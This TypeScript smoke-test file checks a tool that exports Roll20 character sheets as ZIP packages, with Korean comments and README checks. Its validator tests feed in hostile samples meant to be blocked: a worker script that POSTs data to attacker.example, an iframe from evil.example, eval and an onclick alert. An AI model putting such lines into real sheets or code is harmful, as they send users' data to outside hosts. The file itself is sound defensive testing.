/**
 * Export 모듈 smoke 테스트 — 외부 의존 0, jsdom X.
 *
 * Stage 3 자동 검증:
 *   (1) 정상 emit 결과 → ERROR 없음 → buildZip 성공 → unzip 4 파일 + README.txt
 *   (2) PbtA-style narrative emit → 동일
 *   (3) <iframe> 박힌 emit → ERROR 감지 → 다운로드 차단 분기
 *   (4) 한국어 경고 메시지 자연스러움 sanity check
 */

import { analyzeEmit } from '../warnings';
import { buildZip, buildFileName } from '../zip_builder';
import { buildManifest, DEFAULT_METADATA } from '../manifest';
import { buildReadme } from '../readme';
import JSZip from 'jszip';
import { hasBlockingError } from '@/lib/stores/workspaceStore';
import { sanitizeForRoll20Legacy } from '@/lib/emit/sanitize';

function assert(cond: unknown, msg: string): void {
  if (!cond) throw new Error(`Assertion failed: ${msg}`);
}

// ── (1) D&D-style emit (정상) ──────────────────────────────────────────────
async function testDndSmoke(): Promise<void> {
  const html = `
    <div class="sheet-tab"><h3 data-i18n="basic-info">Basic Info</h3></div>
    <input data-r20-block-id="internal-name" type="text" name="attr_character_name" value="Hero">
    <input type="number" name="attr_level" min="1" max="20" value="3">
    <rolltemplate class="sheet-rolltemplate-default">
      <div>{{name}} rolls {{r1}}</div>
    </rolltemplate>
    <script type="text/worker">
      on('change:level', () => {
        getAttrs(['level'], (v) => {
          setAttrs({ proficiency: 2 + Math.floor(Number(v.level) / 4) });
        });
      });
    </script>
    <script>window.unsupportedPageProbe = true;</script>
    <script type="application/json">{"preview":"data"}</script>`;
  const css = `.sheet-tab { padding: 8px; color: #222; }`;
  const translation = JSON.stringify({ 'basic-info': '기본 정보' });

  const warnings = analyzeEmit({ html, css, translation, warnings: [] });
  assert(!hasBlockingError(warnings), 'D&D emit must NOT have ERROR');

  const meta = { ...DEFAULT_METADATA, name: 'D&D 5e Sheet', author: 'Tester', system: 'D&D 5e' };
  const zip = await buildZip({ html, css, translation, warnings: [] }, meta);
  assert(zip.fileName.endsWith('.zip'), 'fileName ends with .zip');
  assert(zip.blob.size > 0, 'zip size > 0');

  const buf = await zip.blob.arrayBuffer();
  const unpacked = await JSZip.loadAsync(buf);
  const names = Object.keys(unpacked.files).sort();
  assert(names.includes('sheet.html'), 'sheet.html present');
  assert(names.includes('sheet.css'), 'sheet.css present');
  assert(names.includes('translation.json'), 'translation.json present');
  assert(names.includes('sheet.json'), 'sheet.json present');
  assert(names.includes('README.txt'), 'README.txt present');
  assert(names.includes('unsupported-script-source.txt'), 'unsupported script backup present');

  const manifest = JSON.parse(await unpacked.files['sheet.json'].async('string'));
  assert(manifest.html === 'sheet.html', 'manifest.html');
  assert(manifest.css === 'sheet.css', 'manifest.css');
  assert(manifest.translations === 'translation.json', 'manifest.translations');
  assert(manifest.legacy === false, 'manifest.legacy false');
  assert(Array.isArray(manifest.useroptions), 'manifest.useroptions array');
  assert(manifest.name === 'D&D 5e Sheet', 'manifest.name');
  assert(manifest.authors === 'Tester', 'manifest.authors');
  assert(manifest.system === 'D&D 5e', 'manifest.system');
  assert(manifest.license === 'All rights reserved', 'manifest.license default');

  const sheetHtml = await unpacked.files['sheet.html'].async('string');
  assert(!sheetHtml.includes('data-r20-block-id'), 'export sheet.html strips internal block ids');
  assert(!sheetHtml.includes('unsupportedPageProbe'), 'export sheet.html strips ordinary scripts');
  assert(!sheetHtml.includes('application/json'), 'export sheet.html strips data scripts');
  assert(sheetHtml.includes('type="text/worker"'), 'export sheet.html keeps Sheet Worker');

  const unsupportedScripts = await unpacked.files['unsupported-script-source.txt'].async('string');
  assert(unsupportedScripts.includes('unsupportedPageProbe'), 'ordinary script source is backed up');
  assert(unsupportedScripts.includes('application/json'), 'data script source is backed up');

  const readme = await unpacked.files['README.txt'].async('string');
  assert(readme.includes('Roll20 커스텀 시트 등록 가이드'), 'README KR title');
  assert(readme.includes('sheet.html'), 'README mentions sheet.html');
  assert(readme.includes('HTML Layout'), 'README mentions HTML Layout slot');
  assert(readme.includes('외부 이미지/폰트 확인'), 'README mentions asset verification');
  assert(readme.includes('http(s) 이미지/폰트 URL'), 'README mentions Roll20-ready asset URLs');
  assert(readme.includes('Roll20에 올리지 마세요'), 'README blocks unsupported script backup upload');
}

// ── (2) PbtA narrative-style emit (정상) ──────────────────────────────────
async function testPbtaSmoke(): Promise<void> {
  const html = `
    <div class="pbta-move">
      <label>이동(Act Under Fire) <input type="text" name="attr_move_label"></label>
      <textarea name="attr_move_narrative"></textarea>
    </div>
    <div data-i18n="hx-track">Hx Track</div>`;
  const css = `.pbta-move { display: flex; gap: 8px; }`;
  const translation = JSON.stringify({ 'hx-track': 'Hx 트랙' });
  const warnings = analyzeEmit({ html, css, translation, warnings: [] });
  assert(!hasBlockingError(warnings), 'PbtA emit must NOT have ERROR');
  const zip = await buildZip(
    { html, css, translation, warnings: [] },
    { ...DEFAULT_METADATA, name: 'PbtA Sheet', system: 'PbtA' },
  );
  const buf = await zip.blob.arrayBuffer();
  const unpacked = await JSZip.loadAsync(buf);
  assert(unpacked.files['sheet.html'], 'sheet.html present');
  assert(unpacked.files['sheet.css'], 'sheet.css present');
  assert(unpacked.files['README.txt'], 'README.txt present');
}

// ── (3) <iframe> 박힌 emit → ERROR 차단 ──────────────────────────────────
async function testModeSpecificZipBoundary(): Promise<void> {
  const html = '<div class="sheet-card">Card</div>';
  const sourceCss = `
@font-face {
  font-family: "SyntheticExportFont";
  src: url("https://fonts.example.test/synthetic-export.woff2") format("woff2");
}
.sheet-card { transform: scale(0.9); }
`.trim();
  const modernZip = await buildZip(
    { html, css: sourceCss, translation: '{}', warnings: [] },
    { ...DEFAULT_METADATA, name: 'Modern Mode Boundary', legacy: false },
  );
  const legacyCss = sanitizeForRoll20Legacy(sourceCss).sanitized;
  const legacyZip = await buildZip(
    { html, css: legacyCss, translation: '{}', warnings: [] },
    { ...DEFAULT_METADATA, name: 'Legacy Mode Boundary', legacy: true },
  );
  const modernFiles = await JSZip.loadAsync(await modernZip.blob.arrayBuffer());
  const legacyFiles = await JSZip.loadAsync(await legacyZip.blob.arrayBuffer());
  const modernManifest = JSON.parse(await modernFiles.file('sheet.json')!.async('string'));
  const legacyManifest = JSON.parse(await legacyFiles.file('sheet.json')!.async('string'));
  const modernCss = await modernFiles.file('sheet.css')!.async('string');
  const exportedLegacyCss = await legacyFiles.file('sheet.css')!.async('string');

  assert(modernManifest.legacy === false, 'modern ZIP manifest stays modern');
  assert(legacyManifest.legacy === true, 'legacy ZIP manifest stays legacy');
  assert(modernCss.includes('transform: scale(0.9)'), 'modern ZIP preserves authored transform');
  assert(!/transform\s*:/i.test(exportedLegacyCss), 'legacy ZIP removes unsupported transform');
  assert(/zoom\s*:\s*0\.9/i.test(exportedLegacyCss), 'legacy ZIP converts scale to zoom');
  for (const [mode, css] of [['modern', modernCss], ['legacy', exportedLegacyCss]] as const) {
    assert(
      css.includes('https://fonts.example.test/synthetic-export.woff2'),
      `${mode} ZIP preserves the authored font URL for Roll20 to process`,
    );
    assert(
      !css.includes('https://imgsrv.roll20.net/?src='),
      `${mode} ZIP does not bake preview-only Roll20 proxy URLs`,
    );
  }
}

function testIframeBlocked(): void {
  const html = `<iframe src="https://evil.example/widget"></iframe>`;
  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
  const iframeWarning = warnings.find((w) => w.code === 'export.html.iframe');
  assert(!!iframeWarning, 'iframe warning detected');
  assert(iframeWarning!.severity === 'error', 'iframe = ERROR');
  assert(hasBlockingError(warnings), 'must block download');
}

function testFetchBlocked(): void {
  const html = `<script type="text/worker">
    fetch('https://attacker.example/log', { method: 'POST', body: 'pwned' });
  </script>`;
  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
  assert(
    warnings.some((w) => w.code === 'export.script.external_fetch' && w.severity === 'error'),
    'external fetch ERROR',
  );
}

function testEvalBlocked(): void {
  const html = `<script type="text/worker">eval('1+1')</script>`;
  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
  assert(
    warnings.some((w) => w.code === 'export.script.eval' && w.severity === 'error'),
    'eval ERROR',
  );
}

function testInlineHandlerBlocked(): void {
  const html = `<button onclick="alert(1)">go</button>`;
  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
  assert(
    warnings.some((w) => w.code === 'export.html.inline_handler' && w.severity === 'error'),
    'inline handler ERROR',
  );
}

function testDuplicateRepeatingSectionWarned(): void {
  const html = `
    <fieldset class="repeating_items"><input name="attr_item_name"></fieldset>
    <fieldset class="sheet-summary repeating_items"><input name="attr_item_name" readonly></fieldset>
  `;
  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
  assert(
    warnings.some((w) =>
      w.code === 'export.html.duplicate_repeating_section' && w.severity === 'warning'
    ),
    'duplicate same-name repeating sections warn before Roll20 upload',
  );
  assert(!hasBlockingError(warnings), 'duplicate repeating section warning does not block export');
}

// ── (4) 한국어 메시지 자연스러움 — 어색한 한자/영문 잔재 없는지 ────────────
async function testI18nCommentExportedAsJson(): Promise<void> {
  const html = `<div data-i18n="hello">Hello</div>`;
  const css = '';
  const translation = `<!-- i18n[ko] "hello": "안녕" -->`;
  const zip = await buildZip(
    { html, css, translation, warnings: [] },
    { ...DEFAULT_METADATA, name: 'I18n Comment Sheet' },
  );
  const unpacked = await JSZip.loadAsync(await zip.blob.arrayBuffer());
  const exported = JSON.parse(await unpacked.files['translation.json'].async('string'));
  assert(exported.hello === '안녕', 'i18n comment format exported as Roll20 JSON');
}

function testKoreanMessages(): void {
  const samples = [
    `<iframe src="x"></iframe>`,
    `<script>fetch('//x')</script>`,
    `<button onclick="x()">go</button>`,
    `<img src="https://a.example/x.png">`,
  ];
  const all = samples
    .flatMap((html) => analyzeEmit({ html, css: '', translation: '{}', warnings: [] }))
    .map((w) => w.message);
  // sanity: 모든 메시지가 한글 음절을 포함해야 함
  for (const m of all) {
    assert(/[가-힣]/.test(m), `non-Korean message: ${m}`);
  }
  // 영어 단독 잔재 없는지 (코드 식별자 sheet.html 등은 허용)
  const culprits = all.filter((m) =>
    /\b(should|must|cannot|please|warning:|error:)\b/i.test(m),
  );
  assert(culprits.length === 0, `English-only word in message: ${culprits.join(' / ')}`);
}

function testFileNameSlug(): void {
  assert(buildFileName({ ...DEFAULT_METADATA, name: '내 시트', version: '1.2.3' }) === '내-시트-1.2.3.zip', 'slug korean');
  assert(buildFileName({ ...DEFAULT_METADATA, name: '', version: '' }) === 'sheet-0.1.0.zip', 'defaults');
  assert(buildFileName({ ...DEFAULT_METADATA, name: 'A/B*C', version: '0.1.0' }) === 'ABC-0.1.0.zip', 'sanitize');
}

function testManifestShape(): void {
  const m = JSON.parse(buildManifest({ ...DEFAULT_METADATA, name: '', author: '', system: '' }));
  assert(m.name === 'Untitled Sheet', 'default name');
  assert(m.authors === 'Anonymous', 'default authors');
  assert(m.version === '0.1.0', 'default version');
  assert(!('system' in m), 'system omitted when empty');
  assert(m.legacy === false, 'modern manifest defaults legacy false');

  const legacy = JSON.parse(buildManifest({ ...DEFAULT_METADATA, legacy: true }));
  assert(legacy.legacy === true, 'legacy manifest follows selected mode');
}

function testOrdinaryPageJsWarnedButNotBlocked(): void {
  const html = `<div>safe</div><script>fetch('https://example.invalid')</script>`;
  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
  assert(
    warnings.some((w) => w.code === 'export.script.unsupported_page_js' && w.severity === 'warning'),
    'ordinary page JS warning',
  );
  assert(
    !warnings.some((w) => w.code === 'export.script.external_fetch'),
    'removed page JS does not create a false blocking fetch error',
  );
  assert(!hasBlockingError(warnings), 'unsupported page JS is preserved as backup instead of blocking');
}

function testReadmeIncludesSystem(): void {
  const r = buildReadme({ ...DEFAULT_METADATA, name: 'X', system: 'PbtA' });
  assert(r.includes('시스템: PbtA'), 'readme system line');
  assert(r.includes('Roll20 모드: 신버전'), 'readme modern mode line');
  assert(r.includes('구 버전 무해화 처리를 끄세요'), 'readme modern setup instruction');

  const legacy = buildReadme({ ...DEFAULT_METADATA, name: 'X', legacy: true });
  assert(legacy.includes('Roll20 모드: 구버전 무해화'), 'readme legacy mode line');
  assert(legacy.includes('구 버전 무해화 처리를 켜세요'), 'readme legacy setup instruction');
}

function testReadmeIncludesAssetReplacementNotice(): void {
  const r = buildReadme(
    { ...DEFAULT_METADATA, name: 'Asset Sheet' },
    { includesAssetReplacements: true },
  );
  assert(r.includes('asset-replacements.json'), 'readme asset replacement file line');
  assert(r.includes('Sandbox 또는 새 테스트 방'), 'readme Roll20 recheck line');
}

async function main(): Promise<void> {
  await testDndSmoke();
  console.log('  ✓ D&D smoke');
  await testPbtaSmoke();
  console.log('  ✓ PbtA smoke');
  await testModeSpecificZipBoundary();
  console.log('  ✓ modern/legacy ZIP boundary');
  testIframeBlocked();
  console.log('  ✓ iframe → ERROR');
  testFetchBlocked();
  console.log('  ✓ fetch → ERROR');
  testEvalBlocked();
  console.log('  ✓ eval → ERROR');
  testOrdinaryPageJsWarnedButNotBlocked();
  console.log('  ✓ ordinary page JS → backup warning');
  testInlineHandlerBlocked();
  console.log('  ✓ onclick → ERROR');
  testDuplicateRepeatingSectionWarned();
  console.log('  ✓ duplicate repeating section warning');
  await testI18nCommentExportedAsJson();
  console.log('  ??i18n comment export JSON');
  testKoreanMessages();
  console.log('  ✓ Korean messages natural');
  testFileNameSlug();
  console.log('  ✓ fileName slug');
  testManifestShape();
  console.log('  ✓ manifest shape');
  testReadmeIncludesSystem();
  console.log('  ✓ README system line');
  testReadmeIncludesAssetReplacementNotice();
  console.log('  ✓ README asset replacement notice');
  console.log('All export smoke tests passed.');
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
